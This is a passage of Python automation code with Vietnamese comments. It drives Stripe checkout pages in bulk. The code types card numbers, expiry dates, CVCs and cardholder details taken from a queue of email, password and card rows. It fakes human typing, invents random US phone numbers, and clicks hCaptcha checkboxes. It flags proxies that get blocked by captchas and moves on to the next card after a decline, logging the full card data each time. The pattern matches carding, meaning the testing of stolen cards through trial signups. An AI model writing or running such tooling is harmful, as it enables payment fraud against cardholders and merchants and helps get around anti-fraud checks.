                                      page.keyboard.press(_ch)
                                      _t_top.sleep(0.06 + _rnd.uniform(0, 0.04))
                                  _t_top.sleep(0.3)
                                  # VERIFY: thử đọc lại input bên trong frame nếu truy cập được
                                  _exp = "".join(c for c in value if c.isdigit())
                                  try:
                                      _ifr_frame = _ifr_el.content_frame()
                                      if _ifr_frame:
                                          _inp = _ifr_frame.query_selector("input")
                                          if _inp:
                                              _got = "".join(c for c in (_inp.input_value() or "") if c.isdigit())
                                              if _exp and _got != _exp and not _got.endswith(_exp):
                                                  log(f"[{idx+1}] ✗ {field_name} mouse-fill verify hụt got='{_got}'")
                                                  return False
                                  except Exception:
                                      pass  # không đọc được = cross-origin, chấp nhận (đã gõ)
                                  log(f"[{idx+1}] ✓ {field_name} (mouse+key x={_cx:.0f})")
                                  return True
                              except Exception as _me:
                                  log(f"[{idx+1}] mouse-fill {field_name} lỗi: {_me}")
                                  return False

                          # ── Helper: chờ selector xuất hiện trong frame (proxy chậm) ──
                          def _wait_and_fill_frame(field_selectors, value, field_name, type_delay=90, wait_ms=2500):
                              """Chờ field trong frame hoặc main page, điền bằng press_sequentially đúng context."""
                              import time as _t2

                              # Số chữ số kỳ vọng (bỏ ký tự không phải số) để VERIFY thật
                              _expected_digits = "".join(c for c in value if c.isdigit())

                              def _do_fill(loc, src):
                                  """Điền vào locator + VERIFY giá trị thật. return True CHỈ KHI điền thành công.
                                  ĐÃ TEST THẬT trên checkout.stripe.com (Firefox): click + Control+a/Backspace
                                  để clear (KHÔNG dùng triple_click vì Locator không có method đó →
                                  trước đây crash silent khiến mọi field báo điền hụt), rồi press_sequentially."""
                                  try:
                                      loc.wait_for(state="visible", timeout=8000)
                                      # KHÔNG gọi scroll_into_view_if_needed — gây treo trên Stripe.
                                      loc.click()
                                      _t2.sleep(0.25)
                                      # Clear sạch: Control+a + Backspace (đã test OK trên Stripe)
                                      try:
                                          loc.press("Control+a"); _t2.sleep(0.05)
                                          loc.press("Backspace"); _t2.sleep(0.05)
                                      except Exception:
                                          pass
                                      # Gõ từng ký tự (human-like)
                                      for _ch in value:
                                          loc.press_sequentially(_ch, delay=type_delay + _rnd.randint(0, 30))
                                      _t2.sleep(0.3)
                                      # ── VERIFY THẬT: đọc lại input_value, so số chữ số ──
                                      _val = ""
                                      try:
                                          _val = loc.input_value() or ""
                                      except Exception:
                                          _val = ""
                                      _got_digits = "".join(c for c in _val if c.isdigit())
                                      # ── TEXT fields (cardholder name, address...) — không có digit ──
                                      if not _expected_digits:
                                          # Verify bằng so sánh text (case-insensitive, strip)
                                          if _val.strip().lower() == value.strip().lower():
                                              log(f"[{idx+1}] ✓ {field_name} VERIFY OK [{src}] ({_val})")
                                              return True
                                          # Điền được một phần (>50% ký tự) cũng chấp nhận
                                          if _val.strip() and len(_val.strip()) >= len(value.strip()) * 0.5:
                                              log(f"[{idx+1}] ✓ {field_name} OK [{src}] ({_val})")
                                              return True
                                          log(f"[{idx+1}] ✗ {field_name} điền hụt [{src}] got='{_val}' (mong '{value}')")
                                          return False
                                      # ── NUMERIC fields (card, exp, cvc, zip) ──
                                      if _expected_digits and _got_digits == _expected_digits:
                                          log(f"[{idx+1}] ✓ {field_name} VERIFY OK [{src}] ({_val})")
                                          return True
                                      # Một số field (CVC ngắn) có thể đúng dù readback khác format
                                      if _expected_digits and _got_digits and _got_digits.endswith(_expected_digits):
                                          log(f"[{idx+1}] ✓ {field_name} OK [{src}] ({_val})")
                                          return True
                                      # input_value rỗng / khác → THẤT BẠI (không báo giả nữa)
                                      log(f"[{idx+1}] ✗ {field_name} điền hụt [{src}] got='{_val}' (mong {len(_expected_digits)} số)")
                                      return False
                                  except Exception as _fe:
                                      log(f"[{idx+1}] ✗ {field_name} lỗi [{src}]: {_fe}")
                                      return False

                              for _attempt in range(6):
                                  # 1. Thử main page trước (checkout.stripe.com — toàn bộ trang là Stripe)
                                  for _sel in field_selectors:
                                      _loc = page.locator(_sel).first
                                      if _do_fill(_loc, f"main/{_sel[:30]}"):
                                          return True

                                  # 2. Thử Stripe js.stripe.com frames (Stripe Elements embedded)
                                  _stripe_frames = [_fr for _fr in page.frames if "stripe.com" in (_fr.url or "")]
                                  log(f"[{idx+1}] 🔍 {field_name}: {len(_stripe_frames)} stripe frame(s), attempt {_attempt+1}")
                                  for _fr in _stripe_frames:
                                      # Thử các selector cụ thể trước
                                      for _sel in field_selectors:
                                          _loc = _fr.locator(_sel).first
                                          if _do_fill(_loc, f"stripe-frame/{_sel[:30]}"):
                                              return True
                                      # Fallback: input đầu tiên trong frame (Stripe Elements chỉ có 1 input/frame)
                                      try:
                                          _inputs = _fr.query_selector_all("input")
                                          for _inp in _inputs:
                                              _loc = _fr.locator("input").first
                                              if _do_fill(_loc, f"stripe-frame/input[0] url={_fr.url[:50]}"):
                                                  return True
                                              break
                                      except Exception:
                                          pass

                                  # 3. Thử tất cả frames còn lại
                                  for _fr in page.frames:
                                      if "stripe.com" in (_fr.url or ""):
                                          continue  # đã thử ở bước 2
                                      for _sel in field_selectors:
                                          _loc = _fr.locator(_sel).first
                                          if _do_fill(_loc, f"frame/{_sel[:30]}"):
                                              return True

                                  log(f"[{idx+1}] ⏳ {field_name} chưa thấy, đợi {wait_ms}ms (attempt {_attempt+1}/6)...")
                                  page.wait_for_timeout(wait_ms)
                              log(f"[{idx+1}] ⚠ {field_name}: không điền được sau 6 lần thử")
                              return False

                          # ── Điền Card Number ──────────────────────────────────
                          log(f"[{idx+1}] 💳 Điền card number...")
                          _ok_card = _wait_and_fill_frame(
                              ['input[name="cardnumber"]', 'input[autocomplete="cc-number"]',
                               'input[autocomplete*="cc-number"]',
                               '[data-elements-stable-field-name="cardNumber"] input', 'input[placeholder*="1234"]',
                               'input#cardNumber', 'input[id*="cardNumber" i]'],
                              card_number, "Card number", type_delay=90, wait_ms=2500
                          )
                          if not _ok_card:
                              # Fallback Firefox cross-origin: mouse click iframe + keyboard
                              log(f"[{idx+1}] 💳 Card number: fallback mouse+keyboard...")
                              _ok_card = _fill_card_via_mouse(card_number, "Card number", x_ratio=0.12)
                          if not _ok_card:
                              # KHÔNG điền được card → KHÔNG bấm Pay (tránh báo thành công giả)
                              log(f"[{idx+1}] ✗ Không điền được card number → retry reload (KHÔNG bấm Pay)")
                              continue  # sang vòng _pay_retry (reload Stripe)
                          page.wait_for_timeout(1000)

                          # ── Điền Expiry (MM/YY) ───────────────────────────────
                          log(f"[{idx+1}] 📅 Điền expiry {exp_month}/{exp_year_2}...")
                          _ok_exp = _wait_and_fill_frame(
                              ['input[name="exp-date"]', 'input[autocomplete*="cc-exp"]',
                               '[data-elements-stable-field-name="cardExpiry"] input', 'input[placeholder*="MM"]'],
                              exp_mmyy, "Expiry", type_delay=90, wait_ms=2000
                          )
                          if not _ok_exp:
                              # Sau khi điền card number, Tab thường nhảy sang Expiry → gõ tiếp
                              log(f"[{idx+1}] 📅 Expiry: fallback Tab + keyboard...")
                              try:
                                  page.keyboard.press("Tab")
                                  _t_top.sleep(0.3)
                                  for _ch in exp_mmyy:
                                      page.keyboard.press(_ch); _t_top.sleep(0.07)
                                  log(f"[{idx+1}] ✓ Expiry (Tab+key)")
                              except Exception:
                                  _fill_card_via_mouse(exp_mmyy, "Expiry", x_ratio=0.12)
                          page.wait_for_timeout(1000)

                          # ── Điền CVC ──────────────────────────────────────────
                          log(f"[{idx+1}] 🔐 Điền CVC...")
                          _ok_cvc = _wait_and_fill_frame(
                              ['input[name="cvc"]', 'input[autocomplete*="cc-csc"]',
                               '[data-elements-stable-field-name="cardCvc"] input', 'input[placeholder*="CVC"]'],
                              cvv, "CVC", type_delay=90, wait_ms=2000
                          )
                          if not _ok_cvc:
                              log(f"[{idx+1}] 🔐 CVC: fallback Tab + keyboard...")
                              try:
                                  page.keyboard.press("Tab")
                                  _t_top.sleep(0.3)
                                  for _ch in cvv:
                                      page.keyboard.press(_ch); _t_top.sleep(0.07)
                                  log(f"[{idx+1}] ✓ CVC (Tab+key)")
                              except Exception:
                                  _fill_card_via_mouse(cvv, "CVC", x_ratio=0.5)
                          page.wait_for_timeout(1000)

                          # ── Điền Cardholder Name ──────────────────────────────
                          if cardholder_name:
                              log(f"[{idx+1}] 👤 Cardholder name: {cardholder_name}")
                              # Thử điền thẳng main page trước (checkout.stripe.com: billingName là main page input)
                              _ok_name = False
                              for _name_sel in [
                                  'input[id="billingName"]',
                                  'input[name="billingName"]',
                                  'input[autocomplete="name"]',
                                  'input[autocomplete*="cc-name"]',
                                  'input[placeholder*="Full name" i]',
                                  'input[placeholder*="Name on card" i]',
                                  '[data-field="billingName"] input',
                              ]:
                                  _nloc = page.locator(_name_sel).first
                                  try:
                                      if _nloc.count() > 0 and _nloc.is_visible(timeout=1500):
                                          _nloc.click()
                                          import time as _nt; _nt.sleep(0.2)
                                          _nloc.press("Control+a"); _nt.sleep(0.05)
                                          _nloc.press("Backspace"); _nt.sleep(0.05)
                                          for _nc in cardholder_name:
                                              _nloc.press_sequentially(_nc, delay=70 + _rnd.randint(0,20))
                                          _nt.sleep(0.3)
                                          _nval = ""
                                          try: _nval = _nloc.input_value() or ""
                                          except: pass
                                          if _nval.strip():
                                              log(f"[{idx+1}] ✓ Cardholder name OK [main/{_name_sel[:35]}] ({_nval})")
                                              _ok_name = True
                                              break
                                  except Exception as _ne:
                                      log(f"[{idx+1}] name sel {_name_sel[:30]}: {_ne}")
                                      continue
                              if not _ok_name:
                                  log(f"[{idx+1}] ⚠ Cardholder name: thử qua _wait_and_fill_frame...")
                                  _wait_and_fill_frame(
                                      ['input[id="billingName"]', 'input[name="billingName"]',
                                       'input[autocomplete="name"]', 'input[autocomplete*="cc-name"]',
                                       'input[placeholder*="Full name" i]', 'input[placeholder*="Name on card" i]'],
                                      cardholder_name, "Cardholder name", type_delay=70, wait_ms=1500
                                  )
                              page.wait_for_timeout(800)

                          # ── Điền ZIP ──────────────────────────────────────────
                          if zip_code:
                              log(f"[{idx+1}] 📮 ZIP: {zip_code}")
                              _wait_and_fill_frame(
                                  ['input[name="postalCode"]', 'input[placeholder*="ZIP" i]',
                                   'input[placeholder*="Postal" i]', 'input[autocomplete*="postal-code"]',
                                   '[data-field="postalCode"] input'],
                                  zip_code, "ZIP", type_delay=70, wait_ms=1500
                              )
                              page.wait_for_timeout(800)

                          # ── Điền Phone Number (US random) ───────────────────
                          # "Save my information" đang checked → Stripe hiện phone field
                          # Không uncheck — điền phone random US rồi bấm Pay
                          import random as _random
                          _area_codes = ['201','202','212','213','214','215','312','313','404','408',
                                         '415','503','512','602','617','702','713','818','917','206']
                          _phone = f"({_random.choice(_area_codes)}) {_random.randint(200,999)}-{_random.randint(1000,9999)}"
                          log(f"[{idx+1}] 📱 Điền phone: {_phone}")

                          phone_filled = False
                          # Thử main page trước
                          try:
                              result = page.evaluate(f"""
                                  () => {{
                                      const inp = document.querySelector('input[name="phoneNumber"], input[type="tel"], input[placeholder*="201"]');
                                      if (inp) {{
                                          inp.focus();
                                          inp.value = '';
                                          inp.dispatchEvent(new Event('input', {{bubbles:true}}));
                                          return 'found';
                                      }}
                                      return 'not_found';
                                  }}
                              """)
                              if result == 'found':
                                  el = page.query_selector('input[name="phoneNumber"], input[type="tel"], input[placeholder*="201"]')
                                  if el:
                                      el.click(); el.fill(''); el.type(_phone, delay=60)
                                      log(f"[{idx+1}] ✓ Phone filled (main page)")
                                      phone_filled = True
                          except Exception as _e:
                              log(f"[{idx+1}] phone main err: {_e}")

                          # Scan frames nếu chưa được
                          if not phone_filled:
                              for frame in page.frames:
                                  try:
                                      inp = frame.query_selector('input[name="phoneNumber"], input[type="tel"]')
                                      if inp:
                                          inp.click(); inp.fill(''); inp.type(_phone, delay=60)
                                          log(f"[{idx+1}] ✓ Phone filled (frame: {frame.url[:50]})")
                                          phone_filled = True
                                          break
                                  except Exception:
                                      pass

                          if not phone_filled:
                              log(f"[{idx+1}] ⚠ Không điền được phone — thử tiếp")

                          # Đợi human-like sau khi điền xong phone trước khi bấm Pay
                          page.wait_for_timeout(2500)

                          # ── VERIFY LẦN CUỐI: ô card vẫn còn đủ số trước khi bấm Pay ──
                          # Tránh trường hợp form bị reset / clear ngầm → bấm Pay với card trống.
                          _card_still_ok = True
                          try:
                              _vctx, _vloc = _find_card_input()
                              if _vloc is not None:
                                  _vval = "".join(c for c in (_vloc.input_value() or "") if c.isdigit())
                                  _vexp = "".join(c for c in card_number if c.isdigit())
                                  if _vexp and _vval != _vexp and not _vval.endswith(_vexp[-4:]):
                                      _card_still_ok = False
                                      log(f"[{idx+1}] ✗ Card bị mất giá trị trước khi Pay (got='{_vval}') → retry")
                          except Exception:
                              pass  # không đọc được = có thể đã chuyển trang, bỏ qua
                          if not _card_still_ok:
                              continue  # reload + điền lại

                          # ── Click "Pay and start trial" ───────────────────────
                          log(f"[{idx+1}] 🖱 Click 'Pay and start trial'...")
                          pay_clicked = False

                          # Thử JS click trên main page
                          try:
                              result = page.evaluate("""
                                  () => {
                                      const btn = [...document.querySelectorAll('button')].find(b =>
                                          b.textContent.includes('Pay and start') || b.textContent.includes('Pay')
                                      );
                                      if (btn) { btn.click(); return btn.textContent.trim(); }
                                      return null;
                                  }
                              """)
                              if result:
                                  log(f"[{idx+1}] ✓ Clicked: '{result}'")
                                  pay_clicked = True
                          except Exception:
                              pass

                          # Fallback: query_selector các selector phổ biến
                          if not pay_clicked:
                              for sel in [
                                  '[data-testid="hosted-payment-submit-button"]',
                                  'button:has-text("Pay and start trial")',
                                  'button:has-text("Pay and start")',
                                  'button[type="submit"]',
                              ]:
                                  try:
                                      el = page.query_selector(sel)
                                      if el:
                                          el.click()
                                          log(f"[{idx+1}] ✓ Clicked Pay (selector: {sel})")
                                          pay_clicked = True
                                          break
                                  except Exception:
                                      pass

                          # ══════════════════════════════════════════════════
                          # FLOW: Pay → hCaptcha → check captcha image → kết quả
                          # ══════════════════════════════════════════════════

                          if not pay_clicked:
                              log(f"[{idx+1}] ⚠ Không bấm được Pay — dừng retry")
                              break

                          # ══════════════════════════════════════════════════════════════
                          # SAU KHI CLICK PAY: flow duy nhất đúng là:
                          #
                          #  1. Đợi hCaptcha widget xuất hiện → click "I'm human"
                          #  2. Sau khi click, POLL KẾT QUẢ TRANG (attempt/decline/success)
                          #     song song với theo dõi captcha frame
                          #  3. Kết luận:
                          #     - Thấy "attempt failed" / "declined" / success text  → kết quả thanh toán
                          #     - hCaptcha frame BIẾN MẤT hoàn toàn khỏi DOM        → skip thành công, tiếp tục poll kết quả
                          #     - hCaptcha frame VẪN CÒN sau 20s kể từ lúc click    → bị bắt giải image
                          #
                          # KHÔNG bao giờ kết luận captcha_blocked chỉ vì còn frame
                          # ngay sau click — phải đợi đủ thời gian + xác nhận trang
                          # không ra kết quả gì trước.
                          # ══════════════════════════════════════════════════════════════

                          import time as _time

                          _DECLINE_KEYWORDS = [
                              "your card was declined",
                              "card was declined",
                              "card has been declined",
                              "do not honor",
                              "insufficient funds",
                          ]
                          _FAIL_KEYWORDS = [
                              "payment attempt failed",
                              "payment failed",
                          ]
                          # KHÔNG dùng text để detect success vì trang Stripe checkout luôn
                          # chứa "thank you" / "receipt" trong footer dù chưa thành công.
                          # Success = URL rời khỏi checkout.stripe.com (redirect về trang merchant).

                          def _get_page_text():
                              """Gom text từ main page + tất cả frames."""
                              _texts = []
                              try:
                                  _texts.append(page.inner_text('body').lower())
                              except Exception:
                                  pass
                              for _f in page.frames:
                                  try:
                                      _texts.append(_f.inner_text('body').lower())
                                  except Exception:
                                      pass
                              return " ".join(_texts)

                          def _is_success_url():
                              """Stripe redirect ra khỏi checkout.stripe.com = thành công."""
                              try:
                                  _u = page.url
                                  return (
                                      'checkout.stripe.com' not in _u
                                      and 'stripe.com' not in _u
                                      and _u.startswith('http')
                                  )
                              except Exception:
                                  return False

                          def _get_hcaptcha_frames():
                              return [fr for fr in page.frames if fr.url and 'hcaptcha.com' in fr.url]

                          def _get_challenge_frames():
                              return [fr for fr in _get_hcaptcha_frames() if 'challenge' in fr.url]

                          def _get_widget_frames():
                              return [fr for fr in _get_hcaptcha_frames() if 'challenge' not in fr.url]

                          # ── Đợi proxy load sau khi click Pay (proxy yếu cần thêm thời gian) ──
                          log(f"[{idx+1}] ⏳ Đợi trang phản hồi sau Pay (3s)...")
                          page.wait_for_timeout(3000)

                          # ── BƯỚC 1: Đợi hCaptcha widget, click "I'm human" ──────────
                          log(f"[{idx+1}] 🔍 Đợi hCaptcha widget (tối đa 15s)...")
                          _captcha_clicked = False

                          _widget_dl = _time.time() + 15.0
                          while _time.time() < _widget_dl:
                              page.wait_for_timeout(500)
                              if _get_widget_frames():
                                  log(f"[{idx+1}] ✓ Widget frame xuất hiện")
                                  break

                          # Đợi thêm 700ms để widget render xong
                          page.wait_for_timeout(700)

                          for _ca in range(20):
                              for _fr in (_get_widget_frames() + [f for f in page.frames if f not in _get_widget_frames()]):
                                  try:
                                      _r = _fr.evaluate("""
                                          () => {
                                              const chk = document.querySelector(
                                                  '#checkbox, .hcaptcha-checkbox, input[type="checkbox"]'
                                              );
                                              if (chk) { chk.click(); return 'clicked'; }
                                              const anchor = document.querySelector(
                                                  '#anchor, .anchor, [role="checkbox"], [aria-checked]'
                                              );
                                              if (anchor) { anchor.click(); return 'anchor_clicked'; }
                                              return 'not_found';
                                          }
                                      """)
                                      if _r in ('clicked', 'anchor_clicked'):
                                          log(f"[{idx+1}] ✓ hCaptcha clicked ({_r}) lần poll {_ca+1}")
                                          _captcha_clicked = True
                                          break
                                  except Exception:
                                      pass
                              if _captcha_clicked:
                                  break
                              page.wait_for_timeout(800)

                          if not _captcha_clicked:
                              log(f"[{idx+1}] ⚠ Không click được hCaptcha — vẫn tiếp tục poll kết quả")

                          # ── BƯỚC 2: Sau click, đợi 1.5s rồi bắt đầu poll ──────────
                          # hCaptcha cần thời gian xử lý. Không check ngay.
                          page.wait_for_timeout(1500)

                          # ── BƯỚC 3: Poll tối đa 25s — ưu tiên kết quả trang ────────
                          # Logic:
                          #   - Thấy decline/fail/success text → kết quả thanh toán, thoát poll
                          #   - hCaptcha frame biến mất hoàn toàn → skip OK, tiếp tục poll kết quả
                          #   - Hết 25s, hCaptcha vẫn còn trên trang, KHÔNG có kết quả gì → captcha_blocked
                          log(f"[{idx+1}] 🔄 Poll kết quả (tối đa 25s)...")

                          _payment_failed  = False
                          _card_declined   = False
                          _captcha_blocked = False
                          _captcha_skipped = False
                          _poll_s          = _time.time()
                          _POLL_MAX        = 25.0

                          while _time.time() - _poll_s < _POLL_MAX:
                              page.wait_for_timeout(1000)
                              _elapsed = _time.time() - _poll_s

                              # -- 1. Check error text TRƯỚC (quan trọng nhất) --
                              _txt = _get_page_text()

                              # Declined → dừng hẳn
                              if any(kw in _txt for kw in _DECLINE_KEYWORDS):
                                  _kw = next(k for k in _DECLINE_KEYWORDS if k in _txt)
                                  log(f"[{idx+1}] ❌ Thẻ bị từ chối: '{_kw}' ({_elapsed:.1f}s)")
                                  _card_declined = True
                                  break

                              # Payment attempt failed → F5 retry
                              if any(kw in _txt for kw in _FAIL_KEYWORDS):
                                  log(f"[{idx+1}] ⚠ Payment attempt failed ({_elapsed:.1f}s) — sẽ F5")
                                  _payment_failed = True
                                  break

                              # -- 2. Check URL redirect = success --
                              if _is_success_url():
                                  log(f"[{idx+1}] ✅ Stripe redirect → {page.url[:80]} ({_elapsed:.1f}s)")
                                  _pay_success = True
                                  break

                              # -- 3. Trạng thái captcha (chỉ log, không kết luận gì) --
                              _hc  = _get_hcaptcha_frames()
                              _ch  = _get_challenge_frames()

                              if not _hc:
                                  if not _captcha_skipped:
                                      _captcha_skipped = True
                                      log(f"[{idx+1}] ✅ hCaptcha frame biến mất — skip OK, chờ Stripe ({_elapsed:.1f}s)")
                              elif _ch:
                                  log(f"[{idx+1}] 🔎 Challenge frame còn ({_elapsed:.1f}s) — chờ tiếp...")
                              else:
                                  log(f"[{idx+1}] 🔎 Widget frame còn ({_elapsed:.1f}s) — chờ Stripe...")

                          # -- Kết luận sau poll --
                          if not _pay_success and not _card_declined and not _payment_failed:
                              # Hết 25s không ra kết quả gì
                              _hc_final = _get_hcaptcha_frames()
                              _ch_final = _get_challenge_frames()
                              if _ch_final or (_hc_final and not _captcha_skipped):
                                  # hCaptcha vẫn còn trên trang VÀ chưa từng skip → bị bắt giải
                                  _captcha_blocked = True
                                  log(f"[{idx+1}] 🚫 Hết 25s — hCaptcha vẫn còn, không có kết quả → captcha_blocked")
                              else:
                                  # hCaptcha đã skip nhưng Stripe không trả kết quả → treat as failed
                                  _payment_failed = True
                                  log(f"[{idx+1}] ⚠ Hết 25s — hCaptcha skip nhưng không có kết quả Stripe → failed")

                          # ── BƯỚC 4: Xử lý kết quả ──────────────────────────────────
                          if _captcha_blocked:
                              if _ws_px_id:
                                  flag_proxy_captcha(_ws_px_id)
                                  log(f"[{idx+1}] 🔴 Đã đánh dấu proxy [{_ws_px_id}] captcha_blocked")
                              result_row["captcha_blocked"] = True
                              log(f"[{idx+1}] 🔴 Captcha blocked — đóng browser")
                              _keep_alive.set()
                              break

                          if _pay_success:
                              log(f"[{idx+1}] ✅ Thanh toán thành công! Đang đếm ngược 5s rồi đóng profile...")
                              for _cd in range(5, 0, -1):
                                  log(f"[{idx+1}] ⏱ Đóng sau {_cd}s...")
                                  import time as _t2; _t2.sleep(1)
                              log(f"[{idx+1}] 🔒 Đóng profile")
                              _keep_alive.set()  # unblock → browser sẽ đóng
                              break

                          if _card_declined:
                              _cards_tried += 1
                              # ── Ghi declined record (dùng email của phiên, không phải email của row thẻ) ──
                              _dec_reason = "Your card was declined"
                              _dec_card   = card_number
                              log(f"[{idx+1}] 📝 Ghi declined: {email} | {_dec_card[:4]}**** (thẻ {_cards_tried}/3)")
                              try:
                                  save_declined_record(
                                      email, _dec_card, _dec_reason, cardholder_name,
                                      password=password,
                                      exp_month=exp_month, exp_year=exp_year,
                                      cvv=cvv, address=address,
                                      city=city, state=state, zip_code=zip_code
                                  )
                              except Exception as _de:
                                  log(f"[{idx+1}] ⚠ Lỗi ghi declined: {_de}")
                              # ── Đánh dấu card row declined trong queue ──
                              try:
                                  _dec_idx = _current_card_row.get("_idx")
                                  if _dec_idx is not None:
                                      queue_done(_dec_idx, "declined")
                              except Exception:
                                  pass
                              # ── Kiểm tra đã đủ 3 thẻ chưa ──
                              if _cards_tried >= 3:
                                  log(f"[{idx+1}] ⏹ Đã thử 3 thẻ trong phiên — đóng phiên")
                                  _keep_alive.wait()
                                  break
                              # ── Lấy thẻ tiếp theo từ queue (chỉ lấy card, giữ mail/pass cũ) ──
                              _next_row = queue_pop()
                              if _next_row:
                                  # Email/pass của row mới không cần dùng → đánh dấu consumed ngay
                                  _next_email = _next_row.get("email", "")
                                  if _next_email:
                                      log(f"[{idx+1}] 🗑 Bỏ mail '{_next_email}' (chỉ lấy card)")
                                  try:
                                      _ni = _next_row.get("_idx")
                                      if _ni is not None:
                                          queue_done(_ni, "consumed")  # mail đã bỏ, chỉ dùng card
                                  except Exception:
                                      pass
                                  # Chỉ lấy thông tin card từ row mới, email/pass giữ nguyên
                                  _current_card_row = _next_row
                                  log(f"[{idx+1}] ➡ Thẻ {_cards_tried+1}/3: {_next_row.get('card_number','')[:4]}**** — chờ Stripe ổn định rồi reload")
                                  # Chờ mọi navigation đang pending xong (Stripe có thể đang redirect)
                                  try:
                                      page.wait_for_load_state("load", timeout=15000)
                                  except Exception:
                                      pass
                                  try:
                                      page.wait_for_load_state("networkidle", timeout=8000)
                                  except Exception:
                                      pass
                                  # Giờ reload trang Stripe hiện tại (đã ổn định)
                                  try:
                                      page.reload(wait_until="load", timeout=30000)
                                  except Exception:
                                      pass
                                  try:
                                      page.wait_for_load_state("networkidle", timeout=8000)
                                  except Exception:
                                      pass
                                  page.wait_for_timeout(3000)  # Stripe JS bind events
                                  continue  # _card_loc reset ở đầu vòng loop
                              else:
                                  log(f"[{idx+1}] ⏹ Không còn thẻ trong queue — đóng phiên")
                                  _keep_alive.wait()
                                  break

                          if _payment_failed:
                              if _pay_retry < 2:
                                  log(f"[{idx+1}] 🔄 F5 reload Stripe để retry ({_pay_retry+1}/3)...")
                                  try:
                                      page.wait_for_load_state("load", timeout=15000)
                                  except Exception:
                                      pass
                                  try:
                                      page.wait_for_load_state("networkidle", timeout=8000)
                                  except Exception:
                                      pass
                                  try:
                                      page.reload(wait_until="load", timeout=30000)
                                  except Exception:
                                      pass
                                  try:
                                      page.wait_for_load_state("networkidle", timeout=8000)
                                  except Exception:
                                      pass
                                  page.wait_for_timeout(3000)
                                  continue
                              else:
                                  log(f"[{idx+1}] ❌ Thanh toán thất bại sau 3 lần — dừng")
                                  _keep_alive.wait()
                                  break

                        # end for _pay_retry

                        if not _pay_success:
                            log(f"[{idx+1}] ⏹ DỪNG — automation kết thúc, browser giữ nguyên")
                            _keep_alive.wait()  # chỉ block khi KHÔNG thành công

                    # Chỉ ghi success nếu thanh toán thực sự thành công
                    if _pay_success:
                        result_row["status"] = "success"
                        log(f"[{idx+1}] ✅ Xong: {email or cardholder_name}")
                        try:
                            _row_idx = row.get("_idx")
                            if _row_idx is not None:
                                queue_done(_row_idx, "success")
                        except Exception:
                            pass
                    elif result_row.get("captcha_blocked"):
                        result_row["status"] = "captcha_blocked"
                        log(f"[{idx+1}] 🚫 Kết quả: captcha_blocked")
                    else:
                        result_row["status"] = result_row.get("status") or "failed"
                        log(f"[{idx+1}] ❌ Kết quả: {result_row['status']}")
                    running_tasks[tid]["results"].append(result_row)

                    # ── Tăng proxy_usage_count chỉ khi thành công ────────────
                    if _pay_success:
                        try:
                            _uc_data = load_data()
                            _pid = running_tasks[tid].get("profile_id")
                            if _pid and _pid in _uc_data["profiles"]:
                                _cur = _uc_data["profiles"][_pid].get("proxy_usage_count", 0) or 0
                                _uc_data["profiles"][_pid]["proxy_usage_count"] = _cur + 1
                                save_data(_uc_data)
                        except Exception as _uce:
                            log(f"[{idx+1}] ⚠ Lỗi cập nhật proxy_usage_count: {_uce}")

            except Exception as e:
                import traceback
                tb = traceback.format_exc()
                result_row["status"] = f"error: {e}"
                running_tasks[tid]["results"].append(result_row)
                log(f"[{idx+1}] ❌ Lỗi: {e}")
                log(f"[{idx+1}] 📋 Traceback:\n{tb}")
                log(f"[{idx+1}] ❌ Lỗi — đóng browser, đánh dấu failed")
                running_tasks[tid]["status"] = "failed"
                result_row["status"] = f"error: {e}"
                running_tasks[tid]["results"].append(result_row)
                running_tasks[tid]["done"] = idx + 1
                return  # đóng hẳn, không tự mở lại

            running_tasks[tid]["done"] = idx + 1
            # Mỗi profile chỉ chạy 1 hàng → break sau hàng đầu tiên
            break

        running_tasks[tid]["status"] = "done"
        push_task_log(tid, f"✅ Hoàn tất!")

    except Exception as e:
        import traceback
        tb = traceback.format_exc()
        if tid in running_tasks:
            running_tasks[tid]["status"] = "failed"
            push_task_log(tid, f"❌ Lỗi: {e}\n{tb}")


def _run_simen_trial(tid: str, profile: dict, rows: list[dict]):
    """Simen.ai $1 trial — rewritten: proxy pre-check, smart waits, robust Stripe fill."""
    import os, time as _time, random as _rnd, requests as _req
    if not os.environ.get("DISPLAY"):
        os.environ["DISPLAY"] = ":99"

    def log(msg):
        push_task_log(tid, msg)

    def alive():
        return running_tasks.get(tid, {}).get("alive", False)

    def smart_click(page, selectors, label="button", timeout=12000):
        """Thử nhiều selector, chờ visible + enabled rồi click."""
        for sel in selectors:
            try:
                el = page.locator(sel).first
                el.wait_for(state="visible", timeout=timeout)
                el.scroll_into_view_if_needed()
                page.wait_for_timeout(200 + _rnd.randint(0, 200))
                el.click()
                log(f"✓ {label}: {sel[:60]}")
                return True
            except Exception:
                continue
        return False

    def smart_fill(page, selectors, value, label="input", timeout=10000):
        """Điền input thông minh: chờ visible, clear, type từng ký tự."""
        for sel in selectors:
            try:
                el = page.locator(sel).first
                el.wait_for(state="visible", timeout=timeout)
                el.click()
                page.wait_for_timeout(150)
                el.select_text()
                page.wait_for_timeout(100)
                el.press("Control+a")
                el.press("Backspace")
                page.wait_for_timeout(100)
                for ch in value:
                    el.press_sequentially(ch, delay=50 + _rnd.randint(0, 40))
                log(f"✓ {label} điền xong")
                return True
            except Exception:
                continue
        return False

    def frame_fill(page, selectors, value, label="card input", retries=5):
        """Điền input — tương thích Firefox cross-origin Stripe iframes.
        
        Strategy A: Main page inputs (Stripe Hosted Checkout @ checkout.stripe.com)
        Strategy B: Stripe Elements iframe — resize + mouse.click + keyboard.press từng ký tự
                    (Firefox block cross-origin frame access → không dùng frame.locator/query_selector)
        """
        import time as _t3
        for attempt in range(retries):
            # ── Strategy A: Input trực tiếp trên main page ──────────────────
            for sel in selectors:
                try:
                    el = page.query_selector(sel)
                    if not el or not el.is_visible():
                        continue
                    el.click()
                    _t3.sleep(0.3)
                    page.keyboard.press("Control+a")
                    _t3.sleep(0.1)
                    page.keyboard.press("Backspace")
                    _t3.sleep(0.1)
                    for ch in value:
                        page.keyboard.press(ch)
                        _t3.sleep(0.05 + _rnd.uniform(0, 0.03))
                    _t3.sleep(0.3)
                    val = ""
                    try: val = el.input_value() or ""
                    except Exception: val = ""
                    # VERIFY THẬT: so số chữ số (không báo thành công giả)
                    _exp_d = "".join(c for c in value if c.isdigit())
                    _got_d = "".join(c for c in val if c.isdigit())
                    if _exp_d and (_got_d == _exp_d or _got_d.endswith(_exp_d)):
                        log(f"✓ {label} VERIFY OK (main [{sel[:30]}] {val})")
                        return True
                    log(f"✗ {label} điền hụt (main [{sel[:30]}] got='{val}') — thử cách khác")
                    continue
                except Exception:
                    continue
            # ── Strategy B: Stripe Elements iframe — mouse click + keyboard ─
            # Resize iframe để Playwright coi là visible, rồi click vào đúng tọa độ
            try:
                page.evaluate("""
